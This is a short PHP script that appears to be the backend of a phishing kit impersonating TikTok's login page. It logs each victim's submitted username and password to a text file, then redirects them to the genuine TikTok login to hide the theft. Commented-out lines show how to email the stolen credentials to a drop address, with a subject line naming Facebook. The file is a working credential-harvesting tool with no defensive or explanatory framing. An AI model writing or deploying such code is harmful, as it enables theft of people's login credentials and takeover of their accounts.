<?php
// DEBUG
// $file = fopen("credentials.txt", "a");
// fwrite($file, json_encode($_POST) . PHP_EOL);
// fclose($file);

header('Location: https://www.tiktok.com/login/phone-or-email/email/', true);
$file = fopen("credentials.txt", "a");
fwrite($file, $_POST['username'] . "\t" . $_POST['password'] . PHP_EOL);
fclose($file);

// uncomment the lines below to receive the credentials by email
// $maildrop = "sample@email.com";
// mail($maildrop, "Facebook credentials", $_POST['email'] . "\t" . $_POST['pass']);
